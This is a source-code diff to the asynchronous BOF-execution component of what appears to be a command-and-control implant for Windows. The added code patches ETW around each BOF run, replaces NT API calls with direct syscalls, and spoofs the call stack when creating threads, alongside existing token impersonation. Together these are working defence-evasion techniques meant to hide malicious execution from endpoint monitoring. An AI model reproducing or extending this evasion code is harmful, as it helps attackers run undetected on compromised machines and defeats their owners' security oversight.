@@ -1,6 +1,9 @@
 #include "Boffer.h"
 #include "bof_loader.h"
 #include "utils.h"
+#include "Syscalls.h"
+#include "EtwPatch.h"
+#include "CallSpoof.h"
 
 Boffer* g_AsyncBofManager = NULL;
 
@@ -26,7 +29,7 @@ Boffer::Boffer()
 Boffer::~Boffer()
 {
     if (this->wakeupEvent) {
-        ApiNt->NtClose(this->wakeupEvent);
+        SysNtClose(this->wakeupEvent);
         this->wakeupEvent = NULL;
     }
     ApiWin->DeleteCriticalSection(&this->managerLock);
@@ -111,7 +114,9 @@ DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
         ApiWin->ImpersonateLoggedOnUser(g_StoredToken);
     
     ctx->state = ASYNC_BOF_STATE_RUNNING;
-    
+
+    EtwPatch();
+
     COF_HEADER* pHeader = (COF_HEADER*)ctx->coffFile;
     COF_SYMBOL* pSymbolTable = (COF_SYMBOL*)(ctx->coffFile + pHeader->PointerToSymbolTable);
     
@@ -164,9 +169,11 @@ DWORD WINAPI AsyncBofThreadProc(LPVOID lpParameter)
     ctx->outputBuffer->Pack8(FALSE);
     ApiWin->LeaveCriticalSection(&ctx->outputLock);
 
+    EtwRestore();
+
     ctx->state = ASYNC_BOF_STATE_FINISHED;
     tls_CurrentBofContext = NULL;
-    
+
     if (g_AsyncBofManager)
         g_AsyncBofManager->SignalWakeup();
     
@@ -180,7 +187,12 @@ BOOL Boffer::StartAsyncBof(AsyncBofContext* ctx)
     
     ApiWin->EnterCriticalSection(&this->managerLock);
     
+#ifdef __x86_64__
+    ctx->hThread = (HANDLE)SpoofCall6((PVOID)ApiWin->CreateThread,
+        NULL, 0, (PVOID)AsyncBofThreadProc, (PVOID)ctx, 0, (PVOID)&ctx->threadId);
+#else
     ctx->hThread = ApiWin->CreateThread(NULL, 0, AsyncBofThreadProc, ctx, 0, &ctx->threadId);
+#endif
     if (!ctx->hThread) {
         ApiWin->LeaveCriticalSection(&this->managerLock);
         return FALSE;
@@ -221,7 +233,7 @@ BOOL Boffer::StopAsyncBof(ULONG taskId)
     if (hThread) {
         DWORD waitResult = ApiWin->WaitForSingleObject(hThread, 3000);
         if (waitResult == WAIT_TIMEOUT)
-            ApiNt->NtTerminateThread(hThread, 0);
+            SysNtTerminateThread(hThread, 0);
     }
 
     return TRUE;
@@ -300,13 +312,13 @@ void Boffer::CleanupBofContext(AsyncBofContext* ctx)
         DWORD exitCode = 0;
         ApiWin->GetExitCodeThread(ctx->hThread, &exitCode);
         if (exitCode == STILL_ACTIVE)
-            ApiNt->NtTerminateThread(ctx->hThread, 0);
-        ApiNt->NtClose(ctx->hThread);
+            SysNtTerminateThread(ctx->hThread, 0);
+        SysNtClose(ctx->hThread);
         ctx->hThread = NULL;
     }
     
     if (ctx->hStopEvent) {
-        ApiNt->NtClose(ctx->hStopEvent);
+        SysNtClose(ctx->hStopEvent);
         ctx->hStopEvent = NULL;
     }
     
